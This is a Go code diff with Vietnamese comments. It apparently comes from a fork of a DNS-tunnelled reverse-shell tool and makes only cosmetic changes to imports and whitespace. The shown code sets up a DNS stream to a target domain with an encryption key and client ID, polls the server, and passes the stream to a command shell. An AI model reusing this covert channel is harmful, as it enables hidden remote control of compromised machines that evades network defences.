@@ -1,10 +1,11 @@
 package transport
 
 import (
-	"github.com/Jeffail/tunny"
-	"github.com/hdqb/chashell/lib/logging"
-	"github.com/rs/xid"
 	"io"
+	"ipwf/lib/logging"
+
+	"github.com/Jeffail/tunny"
+	"github.com/rs/xid"
 )
 
 // khởi tạo dnsStream chứa dữ liệu tên miền encrypt Key và id của client
@@ -13,7 +14,6 @@ type dnsStream struct {
 	encryptionKey string
 	clientGuid    []byte
 }
-
 
 // khởi tạo chức năng với tên DNSStream với giá trị đầu vào là tên miền & encrypt Key với giá trị là string
 func DNSStream(targetDomain string, encryptionKey string) *dnsStream {
@@ -24,7 +24,7 @@ func DNSStream(targetDomain string, encryptionKey string) *dnsStream {
 	// khởi tạo cấu hình chứa dữ liệu lần lượt là tên miền encrypt key và id client
 	dnsConfig := dnsStream{targetDomain: targetDomain, encryptionKey: encryptionKey, clientGuid: guid.Bytes()}
 
-	// gọi chức năng pollRead và thăm dò phía máy chủ 
+	// gọi chức năng pollRead và thăm dò phía máy chủ
 	go pollRead(dnsConfig)
 
 	// khi đã bắt tay thành công thì trả về cho cmd thực thi
@@ -48,7 +48,7 @@ func (stream *dnsStream) Write(data []byte) (int, error) {
 	// Gửi gói init để thông báo rằng chúng tôi sẽ gửi dữ liệu.
 	_, err := sendDNSQuery([]byte(initPacket), stream.targetDomain)
 
-	// nếu thấy có lỗi sẽ hiển thị ra 
+	// nếu thấy có lỗi sẽ hiển thị ra
 	if err != nil {
 		logging.Printf("Unable to send init packet : %v\n", err)
 		return 0, io.ErrClosedPipe
